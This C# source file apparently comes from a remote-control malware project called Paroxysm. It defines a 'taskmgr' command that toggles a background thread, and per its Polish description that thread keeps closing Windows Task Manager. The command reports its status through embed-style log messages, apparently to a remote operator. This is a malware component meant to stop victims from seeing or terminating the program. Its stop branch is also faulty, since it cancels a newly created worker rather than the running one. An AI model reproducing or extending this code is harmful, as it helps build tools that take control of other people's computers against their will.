using System.ComponentModel;
using Paroxysm.API.Commands.Extern;
using Paroxysm.Debug;
using Paroxysm.Hooks.Actions;
using Paroxysm.Tools;

namespace Paroxysm.API.Commands;

public class TaskManagerCmd : ICommand
{
    public CommandOptions Options()
    {
        return new CommandOptions
        {
            Name = "taskmgr",
            Description = "Uruchamia/Wyłącza zamykanie menadżera zadań"
        };
    }

    [Obsolete("Obsolete")]
    public void Execute(string[]? parameters)
    {
        Settings.TaskmgrClosed = !Settings.TaskmgrClosed;
        BackgroundWorker backgroundWorker = new();
        backgroundWorker.WorkerSupportsCancellation = true;

        if (!Settings.TaskmgrClosed)
        {
            backgroundWorker.CancelAsync();
            Logger.CreateEmbed(ELoggerState.Error, "TaskMgr thread has been closed.");
            return;
        }
        
        backgroundWorker.DoWork += TaskManagerAction.Follow;
        backgroundWorker.RunWorkerAsync();
        Logger.CreateEmbed(ELoggerState.Info, "TaskMgr thread has been initialized.");
    }
}